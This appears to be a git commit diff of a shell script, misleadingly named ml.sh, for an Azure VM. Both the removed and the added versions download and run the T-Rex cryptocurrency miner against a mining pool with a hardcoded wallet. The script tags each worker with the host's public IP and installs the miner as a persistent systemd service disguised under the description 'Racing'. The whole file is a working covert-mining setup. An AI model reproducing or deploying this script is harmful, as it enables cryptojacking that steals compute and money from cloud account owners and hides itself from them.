63092570766f34aa594f407d38efb73387ef6f9d
dinhtrungac1 <91616570+dinhtrungac1@users.noreply.github.com>
2021-10-31 09:21:23 +0700

    Update ml.sh

--- ml.sh
+++ ml.sh
@@ -1,21 +1,12 @@
-cd /home/azureuser
-woker=$(date +'%d%m_%H_')
-myip="$(dig +short myip.opendns.com @resolver1.opendns.com)"
-woker+=$myip
-if [[ ! -f isHaveSetupCoin.txt ]]
-then
-    echo "Start setup..."
-    sudo apt-get install linux-headers-$(uname -r) -y
-    distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
-    echo "xxx vip pro" > isHaveSetupCoin.txt
-    wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
-    sudo killall XXX
-    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb3c4278f22af4065c55db747e4efa8ed4ff02153 -p x -w $woker
-else
-    wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz 
-    sudo killall XXX
-    ./t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb3c4278f22af4065c55db747e4efa8ed4ff02153 -p x -w $woker
-fi
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azureuser/t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb3c4278f22af4065c55db747e4efa8ed4ff02153 -p x -w 000000\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
-sudo systemctl daemon-reload
+cd /home/azureuser &&
+woker=$(date +'%d%m_%H_') &&
+myip="$(dig +short myip.opendns.com @resolver1.opendns.com)" &&
+woker+=$myip &&
+sudo apt-get install linux-headers-$(uname -r) -y &&
+distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g') &&
+wget https://github.com/trexminer/T-Rex/releases/download/0.22.1/t-rex-0.22.1-linux.tar.gz ; tar -zxvf t-rex-0.22.1-linux.tar.gz &&
+sudo killall XXX &&
+./t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb3c4278f22af4065c55db747e4efa8ed4ff02153 -p x -w $woker &&
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/azureuser/t-rex -a ethash -o us-eth.2miners.com:2020 -u 0xb3c4278f22af4065c55db747e4efa8ed4ff02153 -p x -w 000000\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service' &&
+sudo systemctl daemon-reload &&
 sudo systemctl enable racing.service
